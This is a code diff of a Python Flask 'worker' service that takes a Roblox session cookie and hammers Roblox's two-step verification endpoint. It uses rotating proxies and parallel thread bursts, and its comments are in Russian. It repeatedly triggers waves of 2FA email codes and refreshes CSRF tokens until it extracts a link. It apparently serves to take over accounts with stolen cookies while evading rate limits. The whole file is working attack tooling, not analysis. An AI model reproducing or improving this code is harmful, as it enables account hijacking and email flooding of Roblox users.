@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
 2FA Worker — бэкенд для Railway.
-Исправлена ошибка нулевых запросов, добавлено логирование и 5-минутный цикл.
+Исправлены: декодирование challenge meta, передача user_id в потоки, логирование email отправок.
 """
 import os
 import re
@@ -97,6 +97,23 @@ def extract_link_from_raw(body: str):
         return link
     return None
 
+def _decode_challenge_meta(challenge_meta_b64: str) -> dict:
+    """Декодирует base64 challenge metadata из заголовка Roblox."""
+    if not challenge_meta_b64:
+        return {}
+    try:
+        # Roblox иногда шлёт URL-safe base64 или обычный — пробуем оба
+        for b64 in (challenge_meta_b64, challenge_meta_b64.replace("-", "+").replace("_", "/")):
+            try:
+                padded = b64 + "=" * (-len(b64) % 4)
+                decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
+                return json.loads(decoded)
+            except Exception:
+                continue
+    except Exception as e:
+        logging.warning("_decode_challenge_meta error: %s | raw=%s", e, challenge_meta_b64[:80])
+    return {}
+
 def _get_user_id_and_csrf(cookie: str) -> tuple[int | None, str | None]:
     try:
         proxy = _next_proxy()
@@ -111,38 +128,90 @@ def _get_user_id_and_csrf(cookie: str) -> tuple[int | None, str | None]:
         r_user = s.get(_URL_AUTH, timeout=10)
         if r_user.status_code == 200:
             uid = r_user.json().get("id")
+            logging.info("Authenticated: user_id=%s", uid)
+        else:
+            logging.warning("Auth failed: status=%s", r_user.status_code)
 
         r_csrf = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
         csrf = r_csrf.headers.get("x-csrf-token")
+
+        # Если аккаунт без 2FA — уже есть ссылка
         if r_csrf.status_code == 200:
             link = extract_link_from_raw(r_csrf.text)
             if link:
                 return uid, "__LINK__:" + link
+
+        # Если CSRF не получили с первого запроса — делаем повтор
+        if csrf and r_csrf.status_code == 403 and not r_csrf.headers.get("rblx-challenge-type"):
+            s.headers["x-csrf-token"] = csrf
+            r2 = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
+            csrf2 = r2.headers.get("x-csrf-token") or csrf
+            if r2.status_code == 200:
+                link = extract_link_from_raw(r2.text)
+                if link:
+                    return uid, "__LINK__:" + link
+            csrf = csrf2
+
+        logging.info("CSRF получен: %s, challenge_type: %s", bool(csrf), r_csrf.headers.get("rblx-challenge-type"))
         return uid, csrf
     except Exception as e:
         logging.error("_get_user_id_and_csrf error: %s", e)
         return None, None
 
-def _trigger_2fa_email_send(session: _requests.Session, user_id: int | None, csrf: str, challenge_id: str, challenge_meta_b64: str) -> bool:
+def _trigger_2fa_email_send(
+    cookie: str,
+    user_id: int | None,
+    csrf: str,
+    challenge_id: str,
+    challenge_meta_b64: str,
+) -> bool:
+    """
+    Отправляет код на email через Roblox 2FA API.
+    Создаёт новую сессию чтобы не конкурировать с потоками.
+    """
     try:
-        meta_json = {}
-        if challenge_meta_b64:
-            padded = challenge_meta_b64 + "=" * (-len(challenge_meta_b64) % 4)
-            decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
-            meta_json = json.loads(decoded)
+        meta_json = _decode_challenge_meta(challenge_meta_b64)
+        logging.debug("challenge meta decoded: %s", meta_json)
 
-        inner_challenge_id = meta_json.get("challengeId") or meta_json.get("twostepVerificationChallengeId") or challenge_id
-        action_type = meta_json.get("actionType") or "Generic"
-        uid = user_id or meta_json.get("userId")
+        # Пробуем все возможные ключи для challengeId
+        inner_challenge_id = (
+            meta_json.get("challengeId")
+            or meta_json.get("twostepVerificationChallengeId")
+            or meta_json.get("challenge_id")
+            or challenge_id
+        )
 
-        if not uid or not inner_challenge_id:
+        action_type = meta_json.get("actionType") or meta_json.get("action_type") or "Generic"
+
+        # user_id может прийти из meta если не передан
+        uid = user_id or meta_json.get("userId") or meta_json.get("user_id")
+
+        if not uid:
+            logging.warning("_trigger_2fa_email_send: uid не найден (user_id=%s, meta=%s)", user_id, meta_json)
             return False
+
+        if not inner_challenge_id:
+            logging.warning("_trigger_2fa_email_send: challenge_id не найден (cid=%s, meta=%s)", challenge_id, meta_json)
+            return False
+
+        proxy = _next_proxy()
+        proxies = _proxy_dict(proxy)
+        s = _requests.Session()
+        s.cookies[".ROBLOSECURITY"] = cookie
+        if proxies:
+            s.proxies.update(proxies)
 
         send_url = f"https://twostepverification.roblox.com/v1/users/{uid}/challenges/email/send-code"
         payload = {"actionType": action_type, "challengeId": inner_challenge_id}
-        r_send = session.post(send_url, json=payload, headers=_base_headers(csrf), timeout=8)
-        return r_send.status_code in (200, 204)
-    except Exception:
+        headers = _base_headers(csrf)
+
+        logging.info("Отправка email 2FA: uid=%s, challengeId=%s, actionType=%s", uid, inner_challenge_id, action_type)
+        r_send = s.post(send_url, json=payload, headers=headers, timeout=8)
+        success = r_send.status_code in (200, 204)
+        logging.info("Email 2FA результат: status=%s, ok=%s, body=%s", r_send.status_code, success, r_send.text[:100])
+        return success
+    except Exception as e:
+        logging.error("_trigger_2fa_email_send exception: %s", e)
         return False
 
 def _one_request(cookie: str, csrf: str, user_id: int | None, trigger_email: bool = True) -> dict:
@@ -159,6 +228,7 @@ def _one_request(cookie: str, csrf: str, user_id: int | None, trigger_email: boo
         r = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
         new_csrf = r.headers.get("x-csrf-token")
 
+        # CSRF обновился — повторяем без challenge (plain 403)
         if r.status_code == 403 and new_csrf and not r.headers.get("rblx-challenge-type"):
             csrf = new_csrf
             s.headers["x-csrf-token"] = csrf
@@ -174,58 +244,86 @@ def _one_request(cookie: str, csrf: str, user_id: int | None, trigger_email: boo
         cmeta = r.headers.get("rblx-challenge-metadata", "")
 
         email_sent = False
-        if r.status_code == 403 and ctype and trigger_email:
-            email_sent = _trigger_2fa_email_send(s, user_id, new_csrf or csrf, cid, cmeta)
+        if r.status_code == 403 and ctype and trigger_email and cid:
+            # Передаём cookie отдельно чтобы _trigger мог создать свою сессию
+            email_sent = _trigger_2fa_email_send(cookie, user_id, new_csrf or csrf, cid, cmeta)
 
         return {
-            "status": r.status_code, "link": link, "challengeType": ctype,
-            "emailSent": email_sent, "newCsrf": new_csrf, "body": r.text[:200],
+            "status": r.status_code,
+            "link": link,
+            "challengeType": ctype,
+            "challengeId": cid,
+            "challengeMeta": cmeta,
+            "emailSent": email_sent,
+            "newCsrf": new_csrf,
+            "body": r.text[:200],
         }
     except Exception as e:
+        logging.error("_one_request exception: %s", e)
         return {"status": 0, "link": None, "body": str(e), "challengeType": "", "emailSent": False, "newCsrf": None}
 
-def run_parallel_api_for_duration(cookie: str, workers: int = BATCH_SIZE, target_emails: int = EMAIL_BURST_TARGET, duration_sec: float = DEADLINE) -> str | None:
+def run_parallel_api_for_duration(
+    cookie: str,
+    workers: int = BATCH_SIZE,
+    target_emails: int = EMAIL_BURST_TARGET,
+    duration_sec: float = DEADLINE,
+) -> str | None:
     start = time.time()
     last_wave_reset = start
     total = 0
     challenges_in_wave = 0
+    emails_sent_total = 0
 
     user_id, csrf = _get_user_id_and_csrf(cookie)
     if csrf and csrf.startswith("__LINK__:"):
+        logging.info("Ссылка получена без 2FA сразу")
         return csrf[9:]
 
     if not csrf:
-        for _ in range(3):
+        for attempt in range(3):
             time.sleep(0.5)
             user_id, csrf = _get_user_id_and_csrf(cookie)
             if csrf:
                 break
+            logging.warning("CSRF retry %d/3 — неудача", attempt + 1)
 
     if not csrf:
-        logging.error("КРИТИЧЕСКАЯ ОШИБКА: Не удалось получить CSRF токен для запуска 2FA потоков!")
+        logging.error("КРИТИЧЕСКАЯ ОШИБКА: Не удалось получить CSRF токен! Проверьте cookie и сеть.")
         return None
 
-    logging.info(f"Воркер запущен: user_id={user_id}, target_emails={target_emails}, deadline={duration_sec}s")
+    logging.info(
+        "Воркер запущен: user_id=%s, csrf=%s…, workers=%d, target_emails=%d, deadline=%ds",
+        user_id, csrf[:8] if csrf else "None", workers, target_emails, int(duration_sec),
+    )
 
     with _futures.ThreadPoolExecutor(max_workers=workers) as ex:
         while total < MAX_TOTAL_REQUESTS and (time.time() - start) < duration_sec:
             now = time.time()
+
+            # Сбрасываем счётчик волны — отправляем email снова
             if challenges_in_wave >= target_emails and (now - last_wave_reset) >= RESEND_WAVE_SEC:
+                logging.info("Новая волна email: сброс счётчика (было %d)", challenges_in_wave)
                 challenges_in_wave = 0
                 last_wave_reset = now
 
             need_more_emails = challenges_in_wave < target_emails
-            futs = [ex.submit(_one_request, cookie, csrf, user_id, need_more_emails) for _ in range(workers)]
+            futs = [
+                ex.submit(_one_request, cookie, csrf, user_id, need_more_emails)
+                for _ in range(workers)
+            ]
             results = [f.result() for f in _futures.as_completed(futs)]
             total += len(results)
 
             for r in results:
                 if r.get("link"):
-                    logging.info(f"УСПЕХ! Ссылка получена: {r['link']}")
+                    logging.info("УСПЕХ! Ссылка получена после %d запросов: %s", total, r["link"])
                     return r["link"]
                 if r.get("status") == 403 and r.get("challengeType"):
                     challenges_in_wave += 1
+                if r.get("emailSent"):
+                    emails_sent_total += 1
 
+            # Обновляем CSRF из любого ответа
             for r in results:
                 if r.get("newCsrf"):
                     csrf = r["newCsrf"]
@@ -235,13 +333,23 @@ def run_parallel_api_for_duration(cookie: str, workers: int = BATCH_SIZE, target
             has_plain_403 = any(not r.get("challengeType") for r in results if r["status"] == 403)
             has_429       = any(r["status"] == 429 for r in results)
 
+            # Логируем статусы каждую волну
+            statuses = [r["status"] for r in results]
+            logging.info(
+                "Батч: total=%d, statuses=%s, challenges_wave=%d, emails_total=%d",
+                total, {s: statuses.count(s) for s in set(statuses)}, challenges_in_wave, emails_sent_total,
+            )
+
             if has_plain_403 and not has_challenge:
+                logging.warning("plain 403 без challenge — CSRF мог протухнуть, обновляем")
                 csrf = None
 
             if challenges_in_wave < target_emails:
                 time.sleep(PAUSE_429 if has_429 else PAUSE_BURST)
             else:
                 time.sleep(PAUSE_429 if has_429 else PAUSE_POLL)
+
+    logging.error("Время вышло: %ds, всего запросов: %d, email отправлено: %d", int(duration_sec), total, emails_sent_total)
     return None
 
 @app.route("/health", methods=["GET"])
@@ -258,11 +366,16 @@ def get_link():
     method = data.get("method", "camera").strip()
     if not cookie:
         return jsonify({"error": "cookie required"}), 400
-    
-    link = run_parallel_api_for_duration(cookie, workers=BATCH_SIZE, target_emails=EMAIL_BURST_TARGET, duration_sec=DEADLINE)
+
+    link = run_parallel_api_for_duration(
+        cookie,
+        workers=BATCH_SIZE,
+        target_emails=EMAIL_BURST_TARGET,
+        duration_sec=DEADLINE,
+    )
     if link:
         return jsonify({"link": link})
-    return jsonify({"error": "failed to get link within 5 minutes"}), 500
+    return jsonify({"error": "failed to get link within deadline"}), 500
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
